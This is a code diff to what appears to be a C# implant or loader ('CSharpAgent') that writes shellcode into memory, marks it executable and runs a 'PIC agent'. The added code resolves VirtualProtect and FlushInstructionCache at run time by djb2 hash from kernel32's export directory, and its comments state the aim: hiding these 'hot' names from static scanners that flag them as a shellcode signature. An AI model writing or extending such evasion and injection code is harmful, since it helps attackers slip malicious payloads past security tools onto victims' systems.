@@ -47,12 +47,12 @@ namespace CSharpAgent
             // delegate call below would fault on execute — an AccessViolation that is
             // UNCATCHABLE on CLR4 (a corrupted-state exception no catch block survives).
             // Bail into the contained status-1 reply instead (audit No.27).
-            if (!NativeImports.ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, 0x40, out oldProtect))
+            if (!ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, 0x40, out oldProtect))
                 throw new InvalidOperationException("VirtualProtect failed on the TEB stub (Win32 error " +
                     Marshal.GetLastWin32Error() + ") — refusing to call non-executable memory");
 
             if (processArch == "ARM64")
-                NativeImports.FlushInstructionCache(new IntPtr(-1), ptr, (UIntPtr)asm.Length);
+                FlushExecutionCache(new IntPtr(-1), ptr, (UIntPtr)asm.Length);
 
             var getTEB = (GetTEBDelegate)Marshal.GetDelegateForFunctionPointer(ptr, typeof(GetTEBDelegate));
 #if DEBUG
@@ -70,7 +70,7 @@ namespace CSharpAgent
             Diag.Show("[inj 3] TEB", Diag.Hex(tebAddress));
 #endif
 
-            NativeImports.ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, oldProtect, out oldProtect);
+            ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, oldProtect, out oldProtect);
             Marshal.FreeHGlobal(ptr);
 
             IntPtr pebAddress = Marshal.ReadIntPtr(IntPtrAdd(tebAddress, IntPtr.Size == 8 ? 0x60 : 0x30));
@@ -118,7 +118,7 @@ namespace CSharpAgent
             Marshal.Copy(bytes, 0, pMemory, bytes.Length);
 
             if (processArch == "ARM64")
-                NativeImports.FlushInstructionCache(new IntPtr(-1), pMemory, (UIntPtr)bytes.Length);
+                FlushExecutionCache(new IntPtr(-1), pMemory, (UIntPtr)bytes.Length);
 
             // No parameter handoff block and no TEB-slot write: code-audited against the PIC
             // (2026-10) — its entry never reads the one argument it receives, never reads a
@@ -139,6 +139,65 @@ namespace CSharpAgent
             Diag.Show("[inj 9] entry RETURNED", "unexpected — the PIC agent returned immediately " +
                 "(early bail on this box?); the reply reports status 0 anyway");
 #endif
+        }
+
+        // --- Runtime-resolved kernel32 entry points (audit No.21, rung 1) ------------------
+        // VirtualProtect and FlushInstructionCache were the two "hot" names in this DLL's
+        // IMPORT TABLE — the static list a scanner reads without ever running the file, and
+        // "make memory executable + flush the instruction cache" is a textbook shellcode
+        // signature. Both are now resolved at call time from the LIVE kernel32 export
+        // directory by the same hash walk GetProcAddressByHash already performs on ntdll,
+        // so neither name appears anywhere in this assembly's metadata. A failed resolve
+        // throws — contained by the 0x0C handler into a status-1 reply, host untouched.
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate bool ProtectMemoryFn(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate bool FlushICacheFn(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
+
+        private static ProtectMemoryFn _protectMemory;
+        private static FlushICacheFn _flushICache;
+
+        // kernel32's base WITHOUT a GetModuleHandle import: the managed module enumeration
+        // (System.dll — already the single assembly reference) names every loaded module.
+        // In a WOW64 process it lists the 32-bit kernel32 — the one whose exports this
+        // 32-bit code can actually call — so bitness always matches the process.
+        private static IntPtr Kernel32Base()
+        {
+            var modules = System.Diagnostics.Process.GetCurrentProcess().Modules;
+            for (var i = 0; i < modules.Count; i++)
+                if (string.Compare(modules[i].ModuleName, "kernel32.dll", true) == 0)
+                    return modules[i].BaseAddress;
+            return IntPtr.Zero;
+        }
+
+        private static IntPtr ResolveKernel32Export(uint eHash)
+        {
+            var kernel32 = Kernel32Base();
+            if (kernel32 == IntPtr.Zero)
+                throw new InvalidOperationException("kernel32.dll is not in the process module list");
+            var proc = GetProcAddressByHash(kernel32, eHash);
+            if (proc == IntPtr.Zero)
+                throw new InvalidOperationException("kernel32 export hash " + eHash + " did not resolve");
+            return proc;
+        }
+
+        private static bool ChangeMemoryProtection(IntPtr address, UIntPtr size, uint newProtect, out uint oldProtect)
+        {
+            oldProtect = 0;
+            if (_protectMemory == null)
+                _protectMemory = (ProtectMemoryFn)Marshal.GetDelegateForFunctionPointer(
+                    ResolveKernel32Export(1467010457), typeof(ProtectMemoryFn)); // djb2(77777) "virtualprotect"
+            return _protectMemory(address, size, newProtect, out oldProtect);
+        }
+
+        private static void FlushExecutionCache(IntPtr process, IntPtr baseAddress, UIntPtr size)
+        {
+            if (_flushICache == null)
+                _flushICache = (FlushICacheFn)Marshal.GetDelegateForFunctionPointer(
+                    ResolveKernel32Export(2380586121), typeof(FlushICacheFn)); // djb2(77777) "flushinstructioncache"
+            _flushICache(process, baseAddress, size);
         }
 
         internal static IntPtr IntPtrAdd(IntPtr p0, int p1)
